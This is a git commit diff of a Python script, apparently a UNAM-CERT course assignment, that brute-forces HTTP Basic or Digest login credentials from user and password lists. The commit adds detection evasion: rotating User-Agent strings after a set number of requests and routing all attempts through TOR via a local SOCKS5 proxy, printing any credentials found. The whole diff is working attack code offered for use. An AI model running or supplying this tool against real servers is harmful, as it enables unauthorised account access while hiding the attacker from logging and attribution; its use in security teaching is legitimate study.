dbcc8ef9bf11daf04abfb5aa7c1ff195727f0a67
andreagonz <andreagonz@ciencias.unam.mx>
2017-12-14 21:23:16 -0600

    Tarea 6 terminada

--- tareas/tarea6.py
+++ tareas/tarea6.py
@@ -2,11 +2,25 @@
 # -*- coding: utf-8 -*-
 #UNAM-CERT
 
+# Se necesita correr pip2 install requests requests[socks] [--upgrade]
+
 import sys
 import optparse
+import requests
 from requests import get
 from requests.exceptions import ConnectionError
 from requests.auth import HTTPDigestAuth
+
+user_agents = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0.1 Safari/604.3.5",
+    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0"
+]
 
 def printError(msg, exit = False):
     sys.stderr.write('Error:\t%s\n' % msg)
@@ -26,7 +40,9 @@ def addOptions():
     parser.add_option('-W', '--password-list', dest='password_list', default=None, help='List of passwords that will be tested during the attack.')
     parser.add_option('-t','--tls', dest='tls', default=False, action='store_true', help='If specified, HTTPS protocol will be used instead of default HTTP.')
     parser.add_option('-d','--digest', dest='digest', default=False, action='store_true', help='If specified, digest authentication will be used instead of default basic authentication.')
-    opts,args = parser.parse_args()
+    parser.add_option('-T','--tor', dest='tor', default=False, action='store_true', help='If specified, requests will be done over TOR.')
+    parser.add_option('-a','--change-user-agent', type="int", dest='useragent', default=5, help='Number of requests after which user agent will be changed.')
+    opts, args = parser.parse_args()
     return opts
     
 def checkOptions(options):
@@ -40,6 +56,8 @@ def checkOptions(options):
         printError('Especificar sólamente una contraseña o una lista de contraseñas.', True)
     if options.user and options.user_list:
         printError('Especificar sólamente un usuario o una lista de usuarios.', True)
+    if options.useragent <= 0:
+        printError('Especificar un entero mayor a cero para el número de requests tras el cual se cambia el agente de usuario.', True)
 
 def reportResults(resultados, archivo, stdout):
     if not archivo or (archivo and stdout):
@@ -54,11 +72,20 @@ def buildURL(server, port, protocol='http', tls=False):
     url = '%s://%s:%s' % (protocol, server, port)
     return url
 
-def makeRequest(host, user, password, verboso, digest):
+def makeRequest(host, user, password, verboso, digest, user_agent, tor):
     try:
+        headers = {'User-Agent': user_agent}
         auth = HTTPDigestAuth(user, password) if digest else (user, password)
-        response = get(host, auth=auth)
+        response = None
+        if tor:
+            session = requests.session()
+            session.proxies = {'http':  'socks5://127.0.0.1:9050',
+                               'https': 'socks5://127.0.0.1:9050'}
+            response = session.get(host, auth=auth, headers=headers)
+        else:
+            response = get(host, auth=auth, headers=headers)
         if verboso:
+            print "Agente de usuario: %s" % user_agent
             print "Usuario: %s, Contraseña: %s, Respuesta: %s" % (user, password, str(response))
         if response.status_code == 200:
             return True
@@ -93,16 +120,26 @@ if __name__ == '__main__':
         usuarios = get_users(opts.user, opts.user_list)
         passwords = get_passwords(opts.password, opts.password_list)
         tipo = "Digest" if opts.digest else "Basic"
-        s = ["URL destino: %s" % url, "Tipo de autenticación: %s" % tipo]
+        s = ["URL destino: %s" % url,
+             "Tipo de autenticación: %s" % tipo,
+             "Usando conexión a través de TOR: %s" % opts.tor
+        ]
         if opts.verbose:
             print "\n".join(s)
+            if opts.tor:
+                print "Usando conexión a través de TOR"
+        ua = 0
+        i = 1
         for u in usuarios:
             for p in passwords:
-                if makeRequest(url, u, p, opts.verbose, opts.digest):
+                if i % opts.useragent == 0:
+                    ua = (ua + 1) % len(user_agents)
+                i += 1
+                if makeRequest(url, u, p, opts.verbose, opts.digest, user_agents[ua], opts.tor):
                     s.append('CREDENCIALES ENCONTRADAS!: %s\t%s' % (u,p))
                     if opts.verbose:
                         print s[-1]
-        if len(s) == 2:
+        if len(s) == 3:
             s.append("No se encontró nada")
         reportResults('\n'.join(s), opts.report, opts.stdout)
     except Exception as e:
